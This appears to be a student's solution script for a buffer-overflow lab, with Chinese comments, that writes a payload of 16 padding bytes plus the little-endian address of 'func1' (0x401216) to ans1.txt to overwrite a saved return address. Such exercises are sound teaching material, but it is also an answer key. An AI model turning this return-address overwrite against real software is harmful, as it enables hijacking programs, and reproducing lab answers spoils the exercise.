# 1. 填充物：算出是 16 字节
# (8字节填满缓冲区 + 8字节覆盖旧RBP)
padding = b"A" * 16

# 2. 目标地址：func1 的地址 0x401216
# 必须写成小端序 (Little Endian)
func_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"

# 3. 组合
payload = padding + func_address

with open("ans1.txt", "wb") as f:
    f.write(payload)
    
print("Payload written to ans1.txt")